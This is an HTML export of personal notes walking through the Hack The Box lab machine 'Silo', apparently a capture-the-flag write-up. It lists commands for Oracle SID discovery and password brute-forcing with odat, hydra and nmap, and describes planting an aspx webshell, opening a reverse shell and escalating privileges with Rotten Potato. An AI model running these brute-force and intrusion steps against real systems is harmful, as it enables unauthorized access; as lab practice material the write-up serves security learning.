<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.82 Silo</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.82 Silo</h1><br/>nmap showed that smb, http and oracle were open.<br />http was a default iis webpage and smb was locked up.<br />Becasue it was oracle i followed the standard steps.<br /><br />installing <a href="https://github.com/quentinhardy/odat">https://github.com/quentinhardy/odat</a> was a massive pain in the ass, but ippsec helped.<br /><br />first, I discovered sids<br />python3 /Yeet/Machines/HTB/Silo/odat/odat all -s 10.10.10.82 <br /><br />second, brute forced logins with a custom password list (now on on pirvate github repo)<br />python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file ../oracle_userpass.txt<br /><br />third, logged in with the new creds via sqlplus64<br />sqlplus64<br /><br />forth, I verified that I could read the default webpage with a sql script<br /><br />fifth, I verified I could write a file to the webpage<br /><br />sixth, I wrote a short aspx webshell to the webpage<br /><br />seventh, I got a reverse shell with nisheng invoke-powershelltcp.ps1<br /><br />eighth, In running windows privesc commands I saw that the machine may be vulnerable to rotten potato<br /><br />nine, uploaded files with certutil, ran rotten potato and rooted!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />2. discover sid<br />nmap --script=oracle-sid-brute -p 1521 10.10.10.82<br />--or--<br />hydra -L ./sids.txt -s 1521 10.10.10.82 oracle-sid<br />--or--<br />python3 /Yeet/Machines/HTB/Silo/odat/odat sidguesser -s 10.10.10.82<br />--or--<br />python3 /Yeet/Machines/HTB/Silo/odat/odat all -s 10.10.10.82                    &lt;&lt;&lt;&lt;recomended to start even though it be way slow<br /><br />3. brute logins on the sid<br />python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file ../oracle_userpass.txt<br />                                                                                ^ is the sid                ^password list on my private github repo<br />                                                                                <br />4. login with sqlplus64 (subnode)</div></body></html>